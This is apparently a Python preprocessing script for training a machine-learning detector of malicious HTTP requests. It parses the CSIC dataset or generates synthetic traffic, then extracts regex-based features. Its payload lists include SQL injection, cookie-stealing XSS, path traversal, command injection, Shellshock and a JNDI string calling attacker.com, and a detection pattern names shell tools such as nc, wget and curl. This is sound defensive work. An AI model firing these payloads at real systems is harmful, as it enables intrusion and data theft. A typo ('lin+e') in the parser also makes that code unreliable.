import pandas as pd
import numpy as np
import re
import os
import json
from collections import Counter

os.makedirs("data/raw",       exist_ok=True)
os.makedirs("data/processed", exist_ok=True)
os.makedirs("models",         exist_ok=True)
os.makedirs("logs",           exist_ok=True)


MAX_SAMPLES_PER_CLASS = 10_000


print("Start")

print(f"  Cap per class  : {MAX_SAMPLES_PER_CLASS:,}")
print(f"  Expected output: ~{MAX_SAMPLES_PER_CLASS * 2:,} balanced samples")
print()



def parse_csic_file(filepath, label):
    records = []
    if not os.path.exists(filepath):
        return records
    with open(filepath, "r", errors="ignore") as f:
        raw = f.read()
    for block in raw.strip().split("\n\n"):
        lines = block.strip().split("\n")
        if not lines or not lines[0].startswith(("GET", "POST", "PUT", "DELETE")):
            continue
        first = lines[0].split()
        record = {
            "label":        label,
            "is_malicious": 0 if label == "normal" else 1,
            "method":       first[0] if len(first) > 0 else "GET",
            "url":          first[1] if len(first) > 1 else "/",
            "body":         "",
            "user_agent":   "",
        }
        in_body = False
        for line in lines[1:]:
            if lin+e == "":
                in_body = True
            elif in_body:
                record["body"] += line
            elif line.lower().startswith("user-agent:"):
                record["user_agent"] = line.split(":", 1)[1].strip()
        records.append(record)
    return records


#Synthetic Generator
def generate_synthetic_dataset(n_normal=3000, seed=42):
    rng = np.random.default_rng(seed)
    normal_urls = [
        "/index.php?id={}", "/shop?cat={}&page={}", "/user/profile?uid={}",
        "/search?q=python+tutorial", "/api/products?limit=10&offset={}",
        "/blog/post/{}", "/login", "/register", "/about", "/contact",
    ]
    normal_bodies = [
        "username=alice&password=securepass123",
        "email=user@example.com&name=John+Doe",
        "product_id={}&qty=2", "page=1&limit=20&sort=price_asc", "",
    ]
    sqli  = ["' OR '1'='1", "admin'--", "1' UNION SELECT NULL--", "' OR 1=1--",
             "1'; DROP TABLE users--", "1' AND SLEEP(5)--", "UN/**/ION SE/**/LECT"]
    xss   = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>",
             "<iframe src='javascript:alert(1)'>", "javascript:alert(document.cookie)",
             "<body onload=alert('XSS')>", "<svg/onload=alert('XSS')>"]
    path  = ["../../etc/passwd", "..\\..\\windows\\system32\\cmd.exe",
             "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd", "../../../../boot.ini"]
    cmd   = ["; ls -la", "| cat /etc/passwd", "&& whoami", "`id`", "$(id)"]
    header= ["() { :; }; echo; /bin/bash -c 'id'", "${jndi:ldap://attacker.com/exploit}"]

    records = []
    for _ in range(n_normal):
        url  = rng.choice(normal_urls).format(*[rng.integers(1, 500) for _ in range(3)])
        body = rng.choice(normal_bodies).format(*[rng.integers(1, 200) for _ in range(2)])
        records.append({"method": rng.choice(["GET", "POST"], p=[0.6, 0.4]),
                        "url": url, "body": body,
                        "user_agent": "Mozilla/5.0 (X11; Linux x86_64)",
                        "label": "normal", "is_malicious": 0})
    for payloads, label, n in [
        (sqli, "sqli", 250), (xss, "xss", 200),
        (path, "path_traversal", 150), (cmd, "cmd_injection", 150),
        (header, "header_attack", 100),
    ]:
        for _ in range(n):
            p = rng.choice(payloads)
            m = rng.choice(["GET", "POST"])
            records.append({"method": m,
                            "url": f"/search?q={p}" if m == "GET" else "/login",
                            "body": "" if m == "GET" else f"input={p}&submit=1",
                            "user_agent": rng.choice(["Mozilla/5.0", "sqlmap/1.7"]),
                            "label": label, "is_malicious": 1})
    return pd.DataFrame(records).sample(frac=1, random_state=seed).reset_index(drop=True)


#Feature Engineering
def calculate_entropy(s: str) -> float:
    if not s:
        return 0.0
    counts = Counter(s)
    total  = len(s)
    return -sum((c / total) * np.log2(c / total) for c in counts.values())


def extract_features(row: dict) -> dict:
    url     = str(row.get("url",        ""))
    body    = str(row.get("body",       ""))
    method  = str(row.get("method",     "GET"))
    ua      = str(row.get("user_agent", ""))
    payload = url + " " + body
    pl      = payload.lower()
    f       = {}

    f["url_length"]     = len(url)
    f["body_length"]    = len(body)
    f["payload_length"] = len(payload)
    f["num_params"]     = url.count("=")

    f["count_single_quote"]  = payload.count("'")
    f["count_double_quote"]  = payload.count('"')
    f["count_semicolon"]     = payload.count(";")
    f["count_lt"]            = payload.count("<")
    f["count_gt"]            = payload.count(">")
    f["count_pipe"]          = payload.count("|")
    f["count_ampersand"]     = payload.count("&")
    f["count_dot"]           = payload.count(".")
    f["count_slash"]         = payload.count("/")
    f["count_backslash"]     = payload.count("\\")
    f["count_special"]       = len(re.findall(r"[^a-zA-Z0-9\s]", payload))
    f["ratio_special"]       = f["count_special"] / max(len(payload), 1)
    f["ratio_alpha"]         = sum(c.isalpha() for c in payload) / max(len(payload), 1)
    f["ratio_digit"]         = sum(c.isdigit() for c in payload) / max(len(payload), 1)

    sql_kw = (r'\b(union|select|insert|update|delete|drop|create|alter|exec|execute|'
              r'cast|convert|declare|table|from|where|having|order|group|by|or|and|'
              r'not|null|sleep|benchmark|load_file)\b')
    f["sql_keyword_count"]    = len(re.findall(sql_kw, pl))
    f["has_sql_comment"]      = int(bool(re.search(r'(--|\/\*|\*\/|#)', payload)))
    f["has_tautology"]        = int(bool(re.search(r"('|\")?\s*(or|and)\s+\d+=\d+", pl)))
    f["has_union_select"]     = int(bool(re.search(r'union.{0,20}select', pl)))
    f["has_sleep"]            = int(bool(re.search(r'sleep\s*\(\d+\)|benchmark\s*\(', pl)))

    f["has_script_tag"]       = int("<script" in pl)
    f["has_html_event"]       = int(bool(re.search(r'on\w+\s*=', pl)))
    f["has_javascript_proto"] = int("javascript:" in pl)
    f["has_iframe"]           = int("<iframe" in pl)
    f["has_onerror"]          = int("onerror" in pl or "onload" in pl)
    f["html_tag_count"]       = len(re.findall(r'<[^>]+>', payload))

    f["has_path_traversal"]        = int(bool(re.search(r'\.\.[/\\]', payload)))
    f["dotdot_count"]              = payload.count("..")
    f["has_etc_passwd"]            = int("etc/passwd" in pl or "etc\\passwd" in pl)
    f["has_win_system"]            = int("windows" in pl and "system32" in pl)
    f["percent_encoded_traversal"] = int(bool(re.search(r'%2e%2e[%2f5c]', pl)))

    f["has_cmd_separator"] = int(bool(re.search(r'[;|&`$()]', payload)))
    f["has_shell_cmd"]     = int(bool(re.search(
        r'\b(cat|ls|id|whoami|wget|curl|nc|bash|sh|cmd|powershell|python|perl|ruby)\b', pl)))
    f["has_backtick"]      = int("`" in payload)
    f["has_dollar_paren"]  = int("$(" in payload)

    f["has_shellshock"] = int("() {" in payload or "(){" in payload)
    f["has_jndi"]       = int("jndi:" in pl)

    f["pct_encoded_chars"] = len(re.findall(r'%[0-9a-fA-F]{2}', payload))
    f["hex_sequences"]     = len(re.findall(r'0x[0-9a-fA-F]+', pl))
    f["entropy"]           = calculate_entropy(payload)
    f["url_entropy"]       = calculate_entropy(url)

    f["is_post"]        = int(method.upper() == "POST")
    f["is_get"]         = int(method.upper() == "GET")
    f["has_scanner_ua"] = int(bool(re.search(
        r'(sqlmap|nikto|nmap|masscan|dirbuster|gobuster|burp|zap|nessus)', ua.lower())))

    return f


#Pipeline
print("Loading Dataset")
csic_records = []
for fname, label in [
    ("data/raw/normalTrafficTraining.txt", "normal"),
    ("data/raw/normalTrafficTest.txt",     "normal"),
    ("data/raw/anomalousTrafficTest.txt",  "attack"),
]:
    parsed = parse_csic_file(fname, label)
    csic_records.extend(parsed)
    if parsed:
        print(f"       {len(parsed):>6,} records  ← {fname}")

if csic_records:
    df_raw = pd.DataFrame(csic_records)
    df_raw["is_malicious"] = (df_raw["label"] != "normal").astype(int)
    raw_dist = df_raw["is_malicious"].value_counts().to_dict()
    print(f"       CSIC total: {len(df_raw):,}  |  distribution: {raw_dist}")
else:
    print("       CSIC files not found — generating synthetic dataset...")
    df_raw = generate_synthetic_dataset(n_normal=3000)

#Cap before SMOTE
n_normal_raw = (df_raw["is_malicious"] == 0).sum()
n_attack_raw = (df_raw["is_malicious"] == 1).sum()

n_normal_keep = min(MAX_SAMPLES_PER_CLASS, n_normal_raw)
n_attack_keep = min(MAX_SAMPLES_PER_CLASS, n_attack_raw)

df_normal = df_raw[df_raw["is_malicious"] == 0].sample(n_normal_keep, random_state=42)
df_attack = df_raw[df_raw["is_malicious"] == 1].sample(n_attack_keep, random_state=42)
df_capped = pd.concat([df_normal, df_attack]).sample(frac=1, random_state=42).reset_index(drop=True)

print(f"\n       Capped: normal={n_normal_keep:,}  attack={n_attack_keep:,}  "
      f"total={len(df_capped):,}")
print(f"       (Was {n_normal_raw:,} + {n_attack_raw:,} = {len(df_raw):,} — "
      f"reduced {len(df_raw) - len(df_capped):,} rows)")

print("\nFeature Extraction")
feature_records = []
total = len(df_capped)
for i, (_, row) in enumerate(df_capped.iterrows()):
    if i % 1000 == 0:
        pct = i / total * 100
        bar = "█" * (i // 500) + "░" * (20 - i // 500)
        print(f"       [{bar}] {i:>6,}/{total:,}  {pct:.0f}%", end="\r")
    feats = extract_features(row.to_dict())
    feats["is_malicious"] = row["is_malicious"]
    feats["label"]        = row.get("label", "unknown")
    feature_records.append(feats)
print(f"       [{'█'*20}] {total:,}/{total:,}  100%   ")

df_features  = pd.DataFrame(feature_records)
feature_cols = [c for c in df_features.columns if c not in ["is_malicious", "label"]]
print(f"       {len(feature_cols)} features extracted per request")

print("\nSMOTE Balancing")
from imblearn.over_sampling import SMOTE

X = df_features[feature_cols].fillna(0)
y = df_features["is_malicious"]

n_before_0 = (y == 0).sum()
n_before_1 = (y == 1).sum()
print(f"       Before → Normal: {n_before_0:,}  |  Malicious: {n_before_1:,}")

#Only SMOTE if classes are actually imbalanced (skip when capped equal)
if abs(n_before_0 - n_before_1) > 100:
    smote = SMOTE(random_state=42, k_neighbors=5)
    X_balanced, y_balanced = smote.fit_resample(X, y)
else:
    X_balanced, y_balanced = X.values, y.values
    print("       Classes already balanced — skipping SMOTE")

print(f"       After  → Normal: {(y_balanced==0).sum():,}  |  Malicious: {(y_balanced==1).sum():,}")

df_balanced = pd.DataFrame(X_balanced, columns=feature_cols)
df_balanced["is_malicious"] = y_balanced

print("\nSave")
df_features.to_csv("data/processed/features_raw.csv",      index=False)
df_balanced.to_csv("data/processed/features_balanced.csv", index=False)
with open("models/feature_columns.json", "w") as f:
    json.dump(feature_cols, f, indent=2)


print("End")
print(f"  Balanced samples : {len(df_balanced):,}   ← safe for all 5 models")
print(f"  Features         : {len(feature_cols)}")
print(f"  Saved to         : data/processed/")

